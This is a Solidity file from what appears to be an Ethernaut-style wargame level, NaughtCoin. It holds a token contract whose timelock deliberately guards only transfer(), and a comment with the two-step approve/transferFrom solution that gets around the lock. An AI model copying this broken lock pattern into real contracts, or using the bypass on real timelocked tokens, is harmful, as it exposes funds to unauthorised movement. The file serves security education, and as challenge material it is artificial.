// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * @title 15. NAUGHTY COIN
 * @dev Complete this level by getting your token balance to 0.
 */

/*
The modifier in charge of locking the tokens is poorly implemented. 
Let's take advantage of it to transfer the tokens to another address.

 1. Approve another address to transfer tokens on your behalf
const balance = "1000000000000000000000000";
await contract.approve("TheFutureCoinOwner", balance);

 2. Transfer the tokens to another address using the transferFrom function
await contract.transferFrom("YourAddressHere", "TheFutureCoinOwner", balance);


🎉 Level completed! 🎉
*/

/*////////////////////////////////////////////////////////////////
                        CHALLENGE CONTRACT
////////////////////////////////////////////////////////////////*/

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(
        address _to,
        uint256 _value
    ) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            // Wait, what?!
            _;
        }
    }
}
